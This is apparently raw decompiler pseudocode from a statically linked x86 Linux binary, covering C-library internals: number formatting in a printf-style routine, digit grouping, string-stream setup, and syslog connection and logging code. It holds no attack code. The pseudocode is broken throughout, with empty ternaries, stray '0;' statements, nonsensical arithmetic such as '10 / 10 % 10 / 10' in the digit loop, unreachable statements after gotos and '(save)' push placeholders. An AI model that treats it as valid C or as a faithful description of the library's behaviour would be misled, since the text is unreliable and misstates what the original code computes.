            Vfffffb10 = 10;
            ecx = Vfffffb30;
            ebx = Vfffffb54;
            if(*(ebx + ecx + 12) != 0) {
                edx = *(ebx + ecx + 64) + *(ebx + ecx + 64) * 2;
                edi = Vfffffb4c;
                Vfffffb14 = *(edi + edx * 4);
                Vfffffb18 = *(edi + edx * 4 + 4);
                Vfffffb34 = 0;
                if(Vfffffb18 < 0) {
                    Vfffffb34 = Vfffffb34 + 1;
                }
                0;
                0;
                if(Vfffffb34 != 0) {
                    Vfffffb14 = ~Vfffffb14;
                    asm("adc dword [ebp+0xfffffb18],+0x0");
                    Vfffffb18 = ~Vfffffb18;
                }
                Vfffffb38 = Vfffffb14;
                Vfffffb3c = Vfffffb18;
                goto L08051fb3;
            }
            ecx = Vfffffb30;
            ebx = Vfffffb54;
            if(*(ebx + ecx + 20) == 0) {
                ecx = Vfffffb30;
                ebx = Vfffffb54;
                if(*(ebx + ecx + 16) != 0) {
                    goto L08051f08;
                }
            }
            edx = *(Vfffffb4c + edx * 4);
            goto L08051f25;
L08051f08:
            edx = *(Vfffffb4c + ( *(Vfffffb54 + Vfffffb30 + 64) + *(Vfffffb54 + Vfffffb30 + 64) * 2) * 4);
L08051f25:
            Vfffffb34 = edx >> 31;
            if(!(edx = *(ebx + ecx + 64) + *(ebx + ecx + 64) * 2)) {
                edx = ~edx;
                goto L080520f5;
                Vfffffb10 = 10;
                goto L08051f62;
                Vfffffb10 = 8;
                goto L08051f62;
                Vfffffb10 = 16;
L08051f62:
                Vfffffb34 = 0;
                ebx = Vfffffb30;
                edi = Vfffffb54;
                *(edi + ebx + 36) = 0;
                *(edi + ebx + 28) = 0;
                if(*(edi + ebx + 12) != 0) {
                    edx = *(edi + ebx + 64) + *(edi + ebx + 64) * 2;
                    ecx = Vfffffb4c;
                    Vfffffb38 = *(ecx + edx * 4);
                    Vfffffb3c = *(ecx + edx * 4 + 4);
L08051fb3:
                    edi = Vfffffb30;
                    ecx = Vfffffb54;
                    if(*(ecx + edi) < 0) {
                        *(ecx + edi) = 1;
                    } else {
                        *(Vfffffb54 + Vfffffb30 + 44) = 32;
                    }
                    if(*(Vfffffb54 + Vfffffb30) == 0 && Vfffffb38 == 0 && Vfffffb3c == 0) {
                        esi = & Vffffffff;
                    } else {
                        edi = Vfffffb30;
                        eax = L08062714(Vfffffb38, Vfffffb3c, ebp, Vfffffb10, 0);
                        esi = eax - 1;
                        if(*(Vfffffb54 + edi + 40) != 0 && Vfffffba8 != 0) {
                            eax = L08052C9C(esi, & Vffffffff, Vfffffba8, Vfffffc08);
                            esi = eax;
                        }
                    }
                    edx = 0;
                    if(Vfffffb38 != 0 || Vfffffb3c != 0) {
                        edx = 1;
                    }
                    Vfffffb38 = edx;
                    goto L08052242;
                }
                edi = Vfffffb30;
                ecx = Vfffffb54;
                if(*(ecx + edi + 20) == 0) {
                    edi = Vfffffb30;
                    ecx = Vfffffb54;
                    if(*(ecx + edi + 16) != 0) {
                        goto L080520d8;
                    }
                }
                edx = *(ecx + edi + 64) + *(ecx + edi + 64) * 2;
                edx = *(Vfffffb4c + edx * 4);
                goto L080520f5;
L080520d8:
                edx = *(Vfffffb4c + ( *(Vfffffb54 + Vfffffb30 + 64) + *(Vfffffb54 + Vfffffb30 + 64) * 2) * 4) & 65535;
            }
L080520f5:
            Vfffffb38 = edx;
L080520fb:
            edi = Vfffffb30;
            ecx = Vfffffb54;
            if(*(ecx + edi) < 0) {
                *(ecx + edi) = 1;
            } else {
                *(Vfffffb54 + Vfffffb30 + 44) = 32;
            }
            if(*(Vfffffb54 + Vfffffb30) == 0) {
                if(Vfffffb38 != 0) {
                    goto L0805214c;
                }
                esi = & Vffffffff;
            } else {
L0805214c:
                eax = Vfffffb38;
                edx = ebp;
                Vfffffb14 = "0123456789abcdefghijklmnopqrstuvwxyz";
                if(*(Vfffffb54 + Vfffffb30 + 8) == 88) {
                    Vfffffb14 = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
                }
                esi = edx;
                if(Vfffffb10 != 10) {
                    > ? L08052198 : ;
                    if(Vfffffb10 == 8) {
                        goto L080521d8;
                    }
                    goto L080521f0;
                    if(Vfffffb10 == 16) {
                        goto L080521c0;
                    }
                } else {
L080521a4:
                    esi = esi - 1;
                    edx = 0;
                    *esi = *(10 / 10 % 10 / 10 + Vfffffb14);
                    if(eax != 0) {
                        goto L080521a4;
                    }
                    goto L08052208;
L080521c0:
                    esi = esi - 1;
                    *esi = *(edx + Vfffffb14);
                    eax = eax >> 4;
                    if(edx = eax & 15) {
                        goto L080521c0;
                    }
                    goto L08052208;
L080521d8:
                    esi = esi - 1;
                    *esi = *(edx + Vfffffb14);
                    eax = eax >> 3;
                    if(edx = eax & 7) {
                        goto L080521d8;
                    }
                    goto L08052208;
                }
L080521f0:
                esi = esi - 1;
                edx = 0;
                Vfffffb10 = Vfffffb10 / Vfffffb10;
                *esi = *(Vfffffb10 % Vfffffb10 + Vfffffb14);
                if(eax != 0) {
                    goto L080521f0;
                }
L08052208:
                esi = esi - 1;
                if(*(Vfffffb54 + Vfffffb30 + 40) != 0 && Vfffffba8 != 0) {
                    eax = L08052C9C(esi, & Vffffffff, Vfffffba8, Vfffffc08);
                    esi = eax;
                }
            }
L08052242:
            edx = !esi + ebp;
            ecx = Vfffffb30;
            ebx = Vfffffb54;
            *(ebx + ecx + 4) = *(ebx + ecx + 4) - edx;
            edx = *(ebx + ecx) - edx;
            *(ebx + ecx) = edx;
            if(Vfffffb38 != 0 && *(ebx + ecx + 24) != 0 && Vfffffb10 == 8 && edx <= 0) {
                *esi = 48;
                esi = esi - 1;
                *(ebx + ecx + 4) = *(ebx + ecx + 4) - 1;
            }
            if(*(Vfffffb54 + Vfffffb30) > 0) {
                ecx = Vfffffb30;
                ebx = Vfffffb54;
                *(ebx + ecx + 4) = *(ebx + ecx + 4) - *(ebx + ecx);
                edx = *(ebx + ecx);
                *(ebx + ecx) = *(ebx + ecx) - 1;
                if(edx > 0) {
                    eax = Vfffffb30;
L080522bc:
                    *esi = 48;
                    esi = esi - 1;
                    ecx = Vfffffb54;
                    edx = *(ecx + eax);
                    *(ecx + eax) = *(ecx + eax) - 1;
                    if(edx > 0) {
                        goto L080522bc;
                    }
                }
            }
            if(Vfffffb38 != 0) {
                ebx = Vfffffb30;
                edi = Vfffffb54;
                if(*(edi + ebx + 24) != 0 && Vfffffb10 == 16) {
                    *(edi + ebx + 4) = *(edi + ebx + 4) + -2;
                }
            }
            if(Vfffffb34 == 0) {
                ecx = Vfffffb30;
                ebx = Vfffffb54;
                if(*(ebx + ecx + 36) == 0 && *(ebx + ecx + 28) == 0) {
                    goto L0805232d;
                }
            }
            *(Vfffffb54 + Vfffffb30 + 4) = *(Vfffffb54 + Vfffffb30 + 4) - 1;
L0805232d:
            ebx = Vfffffb30;
            edi = Vfffffb54;
            if(*(edi + ebx + 32) == 0 && *(edi + ebx + 44) == 48) {
                edx = *(edi + ebx + 4);
                *(edi + ebx + 4) = *(edi + ebx + 4) - 1;
                if(edx > 0) {
                    eax = Vfffffb30;
L0805235c:
                    *esi = 48;
                    esi = esi - 1;
                    ecx = Vfffffb54;
                    edx = *(ecx + eax + 4);
                    *(ecx + eax + 4) = *(ecx + eax + 4) - 1;
                    if(edx > 0) {
                        goto L0805235c;
                    }
                }
            }
            if(Vfffffb38 != 0) {
                ebx = Vfffffb30;
                edi = Vfffffb54;
                if(*(edi + ebx + 24) != 0 && Vfffffb10 == 16) {
                    *esi = *(edi + ebx + 8);
                    esi = esi - 1;
                    *esi = 48;
                    esi = esi - 1;
                }
            }
            if(Vfffffb34 != 0) {
                *esi = 45;
            } else {
                if(*(Vfffffb54 + Vfffffb30 + 36) != 0) {
                    *esi = 43;
                } else {
                    if(*(Vfffffb54 + Vfffffb30 + 28) == 0) {
                        goto L080523df;
                    }
                    *esi = 32;
                }
            }
            esi = esi - 1;
L080523df:
            ebx = Vfffffb30;
            edi = Vfffffb54;
            if(*(edi + ebx + 32) == 0 && *(edi + ebx + 44) == 32) {
                edx = *(edi + ebx + 4);
                *(edi + ebx + 4) = *(edi + ebx + 4) - 1;
                if(edx > 0) {
                    eax = Vfffffb30;
L0805240c:
                    *esi = 32;
                    esi = esi - 1;
                    ecx = Vfffffb54;
                    edx = *(ecx + eax + 4);
                    *(ecx + eax + 4) = *(ecx + eax + 4) - 1;
                    if(edx > 0) {
                        goto L0805240c;
                    }
                }
            }
            edi = !esi + ebp;
            eax = *( *( *(A8 + 80) + 52))(A8, esi + 1, edi);
            if(eax != edi) {
                goto L08050e72;
            }
            Vfffffb9c = Vfffffb9c + eax;
            ebx = Vfffffb30;
            edi = Vfffffb54;
            if(*(edi + ebx + 32) == 0 || *(edi + ebx + 4) <= 0) {
                goto L08052933;
            }
            (save) *(edi + ebx + 4);
            (save)32;
            (save)A8;
            goto L08052702;
            eax = 0x8053310;
            goto L080528af;
            ebx = Vfffffb30;
            edi = Vfffffb54;
            *(edi + ebx + 4) = *(edi + ebx + 4) - 1;
            if(*(edi + ebx + 32) == 0 && *(edi + ebx + 4) > 0) {
                Vfffffb9c = Vfffffb9c + L08062534(A8, 32, *(edi + ebx + 4));
            }
            eax = *(Vfffffb4c + ( *(Vfffffb54 + Vfffffb30 + 64) + *(Vfffffb54 + Vfffffb30 + 64) * 2) * 4) & 255;
            ebx = A8;
            if(*(ebx + 24) <= *(ebx + 20)) {
                if(L08061910(ebx, al & 255) == -1) {
                    goto L08050e72;
                }
            } else {
                edi = A8;
                Vfffffb20 = al;
                *( *(edi + 20)) = al;
                *(edi + 20) = *(edi + 20) + 1;
                if((Vfffffb20 & 255) == -1) {
                    goto L08050e72;
                }
            }
            Vfffffb9c = Vfffffb9c + 1;
            ecx = Vfffffb30;
            ebx = Vfffffb54;
            if(*(ebx + ecx + 32) == 0 || *(ebx + ecx + 4) <= 0) {
                goto L08052933;
            }
            (save) *(ebx + ecx + 4);
            (save)32;
            (save)A8;
            goto L08052702;
            esi = *(Vfffffb4c + ( *(Vfffffb54 + Vfffffb30 + 64) + *(Vfffffb54 + Vfffffb30 + 64) * 2) * 4);
L0805257c:
            if(esi == 0) {
                ecx = Vfffffb30;
                ebx = Vfffffb54;
                if(*(ebx + ecx) == -1 || *(ebx + ecx) > 5) {
                    esi = "(null)";
                    Vfffffb10 = 6;
                } else {
                    esi = 0x8067eeb;
                    Vfffffb10 = 0;
                }
            } else {
                edi = Vfffffb30;
                ecx = Vfffffb54;
                if(*(ecx + edi) != -1) {
                    eax = L080575C0(esi, 0, *(ecx + edi));
                    Vfffffb10 = eax != 0 ? eax - esi : *(Vfffffb54 + Vfffffb30);
                } else {
                    al = 0;
                    Vfffffb10 = esi;
                    edi = esi;
                    asm("cld");
                    ecx = -1;
                    asm("repne scasb");
                    Vfffffb10 = !ecx - 1;
                    if(*(Vfffffb54 + Vfffffb30 + 4) == 0) {
                        edi = A8;
                        edx = *(edi + 80);
                        if(Vfffffb10 != *( *(edx + 52))(edi, esi, Vfffffb10)) {
                            goto L08050e72;
                        }
                        Vfffffb9c = Vfffffb9c + Vfffffb10;
                        goto L08052933;
                    }
                }
            }
            edi = Vfffffb30;
            ecx = Vfffffb54;
            edx = *(ecx + edi + 4) - Vfffffb10;
            *(ecx + edi + 4) = edx;
            if(*(ecx + edi + 32) == 0 && edx > 0) {
                Vfffffb9c = Vfffffb9c + L08062534(A8, 32, edx);
            }
            edi = A8;
            edx = *(edi + 80);
            if(Vfffffb10 != *( *(edx + 52))(edi, esi, Vfffffb10)) {
                goto L08050e72;
            }
            Vfffffb9c = Vfffffb9c + Vfffffb10;
            edi = Vfffffb30;
            ecx = Vfffffb54;
            if(*(ecx + edi + 32) == 0 || *(ecx + edi + 4) <= 0) {
                goto L08052933;
            }
            (save) *(ecx + edi + 4);
            (save)32;
            (save)A8;
L08052702:
            Vfffffb9c = Vfffffb9c + L08062534();
            esp = esp + 12;
            goto L08052933;
            edi = Vfffffb30;
            ecx = Vfffffb54;
            edx = *(ecx + edi + 64) + *(ecx + edi + 64) * 2;
            edx = *(Vfffffb4c + edx * 4);
            if(edx != 0) {
                Vfffffb10 = 16;
                Vfffffb38 = edx;
                Vfffffb34 = 0;
                *(ecx + edi + 24) = 1;
                *(ecx + edi + 8) = 120;
                *(ecx + edi + 40) = 0;
                goto L080520fb;
            }
            esi = "(nil)";
            edi = Vfffffb30;
            ecx = Vfffffb54;
            if(*(ecx + edi) > 4) {
                goto L0805257c;
            }
            *(ecx + edi) = 5;
            goto L0805257c;
            ebx = Vfffffb30;
            edi = Vfffffb54;
            if(*(edi + ebx + 12) != 0) {
                edx = *(edi + ebx + 64) + *(edi + ebx + 64) * 2;
                eax = *(Vfffffb4c + edx * 4);
                *eax = Vfffffb9c;
                *(eax + 4) = 0;
                goto L08052933;
            }
            ebx = Vfffffb30;
            edi = Vfffffb54;
            if(*(edi + ebx + 20) != 0) {
                edx = *(edi + ebx + 64) + *(edi + ebx + 64) * 2;
                edx = *(Vfffffb4c + edx * 4);
                *edx = Vfffffb9c;
                goto L08052933;
            }
            edi = Vfffffb30;
            ecx = Vfffffb54;
            if(*(ecx + edi + 16) == 0) {
                edx = *(ecx + edi + 64) + *(ecx + edi + 64) * 2;
                edx = *(Vfffffb4c + edx * 4);
                *edx = Vfffffb9c;
                goto L08052933;
            }
            *( *(Vfffffb4c + ( *(Vfffffb54 + Vfffffb30 + 64) + *(Vfffffb54 + Vfffffb30 + 64) * 2) * 4)) = Vfffffb9c;
            goto L08052933;
            esi = L08056E14( *L08078B14, & Vfffffc18, 1000);
            goto L0805257c;
        }
        eax = *L0807888C != 0 ? *( *L0807888C + ( *(Vfffffb54 + Vfffffb30 + 8) & 255) * 4) : 0;
        if(eax == 0) {
            eax = 0x80529cc;
        }
L080528af:
        ebx = Vfffffb54;
        esp = esp - *(ebx + Vfffffb30 + 72) * 4;
        Vfffffb10 = esp;
        esi = 0;
        goto L080528fc;
L080528d4:
        edx = esi;
        ebx = Vfffffb54;
        edx = edx + *(ebx + Vfffffb30 + 64) + (edx + *(ebx + Vfffffb30 + 64)) * 2;
        edx = Vfffffb4c + edx * 4;
        *(Vfffffb10 + esi * 4) = edx;
        esi = esi + 1;
L080528fc:
        if(*(ebx + Vfffffb30 + 72) > esi) {
            goto L080528d4;
        }
        eax = *eax(A8, Vfffffb54 + Vfffffb30, Vfffffb10);
        if(eax < 0) {
            goto L08050e72;
        }
        Vfffffb9c = Vfffffb9c + eax;
L08052933:
        Vfffffb20 = *(A8 + 80);
        ecx = Vfffffb30;
        ebx = Vfffffb54;
        eax = *( *(Vfffffb20 + 52))(A8, *(Vfffffb54 + Vfffffb30 + 48), *(ebx + ecx + 52) - *(ebx + ecx + 48));
        ecx = Vfffffb30;
        ebx = Vfffffb54;
        if(eax != *(ebx + ecx + 52) - *(ebx + ecx + 48)) {
            goto L08050e72;
        }
        Vfffffb9c = Vfffffb9c + eax;
        Vfffffb30 = Vfffffb30 + 88;
        Vfffffba0 = Vfffffba0 + 1;
        if(Vfffffba0 < Vfffffb5c) {
            goto L08051c08;
        }
    }
L080529b8:
    eax = Vfffffb9c;
L080529be:
    esp = ebp + -1280;
}



L08052C9C(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    esi = A8;
    edi = A10;
    if(*edi != 255) {
        Vfffffffc = *edi & 255;
        ebx = Ac - esi;
        esp = esp - (ebx + 3 & 252);
        Vfffffff8 = esp;
        L0805652C(Vfffffff8, esi + 1, ebx);
        edx = Vfffffff8;
        ecx = edx + ebx - 1;
        esi = Ac;
        if(ecx >= edx) {
            do {
                *esi = *ecx;
                ecx = ecx - 1;
                esi = esi - 1;
                if(!(Vfffffffc = Vfffffffc - 1)) {
                    if(Vfffffff8 > ecx) {
                        break;
                    }
                    *esi = A14;
                    esi = esi - 1;
                    Vfffffffc = *edi & 255;
                    edi = edi + 1;
                    if(*edi != 0) {
                        if(*edi != 255) {
                            continue;
                        } else {
                            goto L08052d24;
                        }
                    }
                    edi = edi - 1;
                }
            } while(Vfffffff8 <= ecx);
            goto L08052d85;
L08052d24:
            edx = Vfffffff8 - 1;
            eax = edx - ecx & 3;
            if(ecx > edx) {
                if(eax == 0) {
                    goto L08052d58;
                }
                if(eax < 3) {
                    if(eax < 2) {
                        *esi = *ecx;
                        ecx = ecx - 1;
                        esi = esi - 1;
                    }
                    *esi = *ecx;
                    ecx = ecx - 1;
                    esi = esi - 1;
                }
            }
            *esi = *ecx;
            ecx = ecx - 1;
            esi = esi - 1;
            if(Vfffffff8 <= ecx) {
L08052d58:
                do {
                    *esi = *ecx;
                    *(esi - 1) = *(ecx - 1);
                    *(esi - 2) = *(ecx - 2);
                    *(esi - 3) = *(ecx - 3);
                    ecx = ecx + -4;
                    esi = esi + -4;
                } while(Vfffffff8 <= ecx);
            }
        }
    }
L08052d85:
    eax = esi;
    esp = ebp - 24;
}



L08052DE8(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffba8;
	/* unknown */ void  Vfffffbb8;
	/* unknown */ void  Vfffffbbc;
	/* unknown */ void  Vfffffbc0;
	/* unknown */ void  Vfffffbf8;
	/* unknown */ void  Vfffffbfc;
	/* unknown */ void  Vfffffc00;



    Vfffffbfc = A8;
    eax = & Vfffffc00;
    Vfffffbb8 = eax;
    Vfffffbbc = Vfffffbb8;
    Vfffffbc0 = ebp;
    Vfffffba8 = -72548348;
    Vfffffbf8 = 0x8067ef4;
    edi = L0804F888( & Vfffffba8, Ac, A10);
    ebx = Vfffffbbc - Vfffffbb8;
    if(ebx > 0) {
        eax = *(A8 + 80);
        if(*( *(eax + 52))(A8, Vfffffbb8, ebx) != ebx) {
            eax = -1;
            goto L08052e72;
        }
    }
    eax = edi;
L08052e72:
    esp = ebp + -1124;
}



L08052E80(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  ebx;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffffc;



    ebx = A10;
    if(ebx == 0) {
        al = 0;
        edi = Ac;
        asm("cld");
        ecx = -1;
        asm("repne scasb");
        ebx = !ecx - 1;
    } else {
        if(ebx < 0) {
            edx = 1024;
            if(Ac + 1024 > Ac) {
                do {
                    if(edx > 67108863) {
                        break;
                    }
                    edx = edx + edx;
                    if(edx <= 0) {
                        break;
                    }
                } while(edx + Ac > Ac);
            }
            ebx = edx;
        }
    }
    ecx = ebx + Ac;
    Vfffffffc = ecx;
    edi = A8;
    eax = L08061B6C(edi, Ac, Vfffffffc, 0);
    *(edi + 16) = Ac;
    *(edi + 12) = Ac;
    *(edi + 4) = Ac;
    if(A14 != 0) {
        *(edi + 20) = A14;
        *(edi + 24) = Vfffffffc;
        *(edi + 8) = A14;
    } else {
        edi = A8;
        *(edi + 20) = Ac;
        *(edi + 24) = Ac;
        *(edi + 8) = Ac + ebx;
    }
    ecx = A8;
    *(ecx + 84) = ebx;
    *(ecx + 88) = 0;
    esp = ebp - 16;
}
















L08054DB8(A8)
/* unknown */ void  A8;
{



    if(A8 == 0) {
L08054dc2:
        *L08078B14 = 22;
        return;
    }
    eax = *A8 & -65536;
    if(eax != -72548352) {
        goto L08054dc2;
    }
    return(L0806267C(A8, 0, 0, 3));
}



L08054DF0(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    return(L080626C8(A8, Ac, 1024));
}




L08054E54(A8)
/* unknown */ void  A8;
{



    eax = close( *L08078894);
    *L08078894 = -1;
    *L0807AC58 = 0;
    if(A8 != 0) {
        *L08078898 = 0;
        *L0807889C = "syslog";
        *L080788A0 = 8;
        *L080788A4 = 255;
    }
}



L08054EB0(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    return(L08054EC8(A8, Ac, & A10));
}


L08054EC8(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffff3dc;
	/* unknown */ void  Vfffff3e0;
	/* unknown */ void  Vfffff3e4;
	/* unknown */ void  Vfffff3e8;
	/* unknown */ void  Vfffff3ec;
	/* unknown */ void  Vfffff3f0;
	/* unknown */ void  Vfffff3f4;
	/* unknown */ void  Vfffff3f8;
	/* unknown */ void  Vfffff3fc;
	/* unknown */ void  Vfffff400;
	/* unknown */ void  Vfffff7fe;
	/* unknown */ void  Vfffff7ff;
	/* unknown */ void  Vfffff800;



    esi = A8;
    Vfffff3e4 = *L08078B14;
    ecx = esi & 7;
    eax = *L080788A4 >> cl;
    if(!(al & 1) && !(esi & -1024)) {
        if(*L08078894 < 0 || *L0807AC58 == 0) {
            L080552B0( *L0807889C, *L08078898 | 8, 0);
        }
        if(!(esi & 1016)) {
            esi = esi | *L080788A0;
        }
        ebx = & Vfffff3fc;
        time(ebx);
        (save)ebx;
        (save)L0805B548() + 4;
        (save)esi;
        (save)"<%d>%.15s ";
        (save)2048;
        ebx = & Vfffff800;
        (save)ebx;
        L08062888();
        esi = ebx;
        esp = esp + 28;
        if(Vfffff800 != 0) {
            do {
                esi = esi + 1;
            } while(*esi != 0);
        }
        if(!( *L08078898 & 32)) {
            Vfffff3e0 = esi;
        }
        if(*L0807889C != 0) {
            L08056640(esi, *L0807889C);
            do {
                esi = esi + 1;
            } while(*esi != 0);
        }
        if(!( *L08078898 & 1)) {
            L08062888(esi, ebp - esi, "[%d]", getpid());
            do {
                esi = esi + 1;
            } while(*esi != 0);
        }
        if(*L0807889C != 0) {
            *esi = 58;
            esi = esi + 1;
            *esi = 32;
            esi = esi + 1;
            *esi = 0;
        }
        ebx = & Vfffff400;
        goto L08055108;
L08055044:
        L080553A0( & Vfffff800, 2048, "[truncated] ");
        if(*esi != 0) {
            do {
                esi = esi + 1;
            } while(*esi != 0);
            goto L0805511b;
L080550b9:
            L080553A0( & Vfffff800, 2048, "[truncated] ");
            do {
                esi = esi + 1;
            } while(*esi != 0);
            if(*ebx != 0) {
                do {
                    ebx = ebx + 1;
                } while(*ebx != 0);
                goto L0805511b;
L08055108:
                while(1) {
                    dl = *Ac;
                    Vfffff3dc = dl;
                    if(Vfffff3dc == 0 || ebx >= & Vfffff7ff) {
                        goto L0805511b;
                    }
                    if(Vfffff3dc == 37) {
                        edx = Ac;
                        if(*(edx + 1) == 37) {
                            goto L0805502e;
                        }
                        if(Vfffff3dc == 37) {
                            edx = Ac;
                            if(*(edx + 1) == 109) {
                                goto L08055087;
                            }
                        }
                    }
                    *ebx = Vfffff3dc;
                    ebx = ebx + 1;
                    goto L08055105;
L08055087:
                    Ac = edx + 1;
                    edi = ebp - ebx + -2048;
                    eax = L08062888(ebx, edi, "%s", L080566A4(), Vfffff3e4);
                    if(eax == -1 || eax > edi) {
                        goto L080550b9;
                    }
                    if(*ebx != 0) {
                        do {
                            ebx = ebx + 1;
                        } while(*ebx != 0);
                        goto L08055105;
L0805502e:
                        if(ebx >= & Vfffff7fe) {
                            goto L08055044;
                        }
                        *ebx = 37;
                        ebx = ebx + 1;
                        *ebx = 37;
                        ebx = ebx + 1;
                        Ac = edx + 1;
                    }
L08055105:
                    Ac = Ac + 1;
                }
            }
        }
L0805511b:
        *ebx = 0;
        if(Vfffff3dc != 0) {
            L080553A0( & Vfffff800, 2048, "[truncated] ");
            do {
                esi = esi + 1;
            } while(*esi != 0);
        }
        edi = ebp - esi;
        eax = L080628A8(esi, edi, & Vfffff400, A10);
        if(eax == -1 || eax > edi) {
            L080553A0( & Vfffff800, 2048, "[truncated] ");
        }
        while(*esi != 0) {
            esi = esi + 1;
        }
        eax = & Vfffff800;
        Vfffff3e8 = esi - eax;
        if(!( *L08078898 & 32)) {
            edx = Vfffff3e0;
            Vfffff3ec = edx;
            eax = Vfffff3ec - eax;
            Vfffff3f0 = Vfffff3e8 - eax;
            Vfffff3f4 = "\n";
            Vfffff3f8 = 1;
            L08056E70(2, & Vfffff3ec, 2);
        }
        esi = & Vfffff800;
        ebx = Vfffff3e8 + esi;
        do {
            eax = write( *L08078894, esi, ebx - esi + 1);
            if(eax < 0) {
                if(*L08078B14 != 11 && *L08078B14 != 4) {
                    goto L0805522c;
                }
                eax = 0;
            }
            esi = esi + eax;
        } while(esi <= ebx);
        goto L0805523e;
L0805522c:
        eax = L08054E54(0);
L0805523e:
        if(esi <= ebx && !( *L08078898 & 2)) {
            eax = open("/dev/console", 1, 0);
            edi = eax;
            if(edi >= 0) {
                (save)"\r\n";
                ebx = & Vfffff800;
                (save)ebx;
                L080577C0();
                Vfffff3e8 = Vfffff3e8 + 2;
                (save)62;
                (save)ebx;
                esi = L08057970() + 1;
                eax = esi - ebx;
                write();
                eax = close(edi, edi, esi, Vfffff3e8 - eax);
            }
        }
    }
    esp = ebp + -3120;
}



L080552B0(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  edi;



    ecx = Ac;
    eax = A10;
    if(A8 != 0) {
        *L0807889C = A8;
    }
    *L08078898 = ecx;
    if(eax != 0 && !(eax & -1017)) {
        *L080788A0 = eax;
    }
    if(*L08078894 == -1) {
        *L0807AC5C = 1;
        eax = L0805680C(0x807ac5e, "/dev/log", 14);
        if(!( *L08078898 & 8)) {
            eax = socket(AF_UNIX, SOCK_STREAM, IP);
            *L08078894 = eax;
            if(eax == -1) {
                goto L0805536a;
            }
        }
        if(*L08078894 == -1) {
            goto L0805536a;
        }
    }
    if(*L0807AC58 == 0) {
        al = 0;
        edi = 0x807ac5e;
        asm("cld");
        ecx = -1;
        asm("repne scasb");
        eax = connect( *L08078894, 0x807ac5c, !ecx + 1);
        if(eax != -1) {
            *L0807AC58 = 1;
        }
    }
L0805536a:
}





L080553A0(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffffc;



    if(A8 != 0 && A10 != 0) {
        al = 0;
        edi = A10;
        asm("cld");
        ecx = -1;
        asm("repne scasb");
        eax = !ecx;
        edi = eax - 1;
        if(edi != 0) {
            ebx = A8;
            if(*ebx == 60) {
                edx = *(ebx + 1) & 255;
                if(!( *( *L08078FA0 + edx * 2 + 1) & 8)) {
                    if(*(ebx + 2) == 62) {
                        ebx = ebx + 3;
                    } else {
                        edx = *(ebx + 2) & 255;
                        if(!( *( *L08078FA0 + edx * 2 + 1) & 8)) {
                            if(*(ebx + 3) == 62) {
                                ebx = ebx + 4;
                            } else {
                                edx = *(ebx + 3) & 255;
                                if(!( *( *L08078FA0 + edx * 2 + 1) & 8) && *(ebx + 4) == 62) {
                                    ebx = ebx + 5;
                                }
                            }
                        }
                    }
                }
            }
            eax = *ebx & 255;
            edx = *L08078FA0;
            if(!( *(edx + eax * 2 + 1) & 4) && !( *(edx + ( *(ebx + 1) & 255) * 2 + 1) & 4) && !( *(edx + ( *(ebx + 2) & 255) * 2 + 1) & 4) && *(ebx + 3) == 32) {
                if(*(ebx + 4) == 32) {
                    goto L0805547a;
                }
                if(!( *(edx + ( *(ebx + 4) & 255) * 2 + 1) & 8)) {
L0805547a:
                    eax = *(ebx + 5) & 255;
                    edx = *L08078FA0;
                    if(!( *(edx + eax * 2 + 1) & 8) && *(ebx + 6) == 32 && !( *(edx + ( *(ebx + 7) & 255) * 2 + 1) & 8) && !( *(edx + ( *(ebx + 8) & 255) * 2 + 1) & 8) && *(ebx + 9) == 58 && !( *(edx + ( *(ebx + 10) & 255) * 2 + 1) & 8) && !( *(edx + ( *(ebx + 11) & 255) * 2 + 1) & 8) && *(ebx + 12) == 58 && !( *(edx + ( *(ebx + 13) & 255) * 2 + 1) & 8) && !( *(edx + ( *(ebx + 14) & 255) * 2 + 1) & 8) && *(ebx + 15) == 32) {
                        ebx = ebx + 16;
                    }
                }
            }
            eax = ebx - A8;
            esi = Ac - eax;
            Vfffffffc = esi;
            eax = Vfffffffc - 1;
            if(edi >= eax) {
                (save)eax;
                (save)ebx;
                (save)A10;
                eax = L08056480();
                *(ebx + Vfffffffc - 1) = 0;
            } else {
                eax = L08056450(ebx, A10, edi);
                if(eax != 0) {
                    *(ebx + Vfffffffc - 1 - edi) = 0;
                    ecx = L08057970(ebx, 0);
                    if(ecx >= ebx) {
                        edx = ebx - 1;
                        eax = edx - ecx & 3;
                        if(ecx > edx) {
                            if(eax == 0) {
                                goto L08055578;
                            }
                            if(eax < 3) {
                                if(eax < 2) {
                                    *(edi + ecx) = *ecx;
                                    ecx = ecx - 1;
                                }
                                *(edi + ecx) = *ecx;
                                ecx = ecx - 1;
                            }
                        }
                        *(edi + ecx) = *ecx;
                        ecx = ecx - 1;
                        if(ecx >= ebx) {
L08055578:
                            do {
                                *(edi + ecx) = *ecx;
                                *(edi + ecx - 1) = *(ecx - 1);
                                *(edi + ecx - 2) = *(ecx - 2);
                                *(edi + ecx - 3) = *(ecx - 3);
                                ecx = ecx + -4;
                            } while(ecx >= ebx);
                        }
                    }
                    eax = L08056480(A10, ebx, edi);
                }
            }
        }
    }
    esp = ebp - 16;
}



L080555B0(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    eax = A8;
    edx = 0;
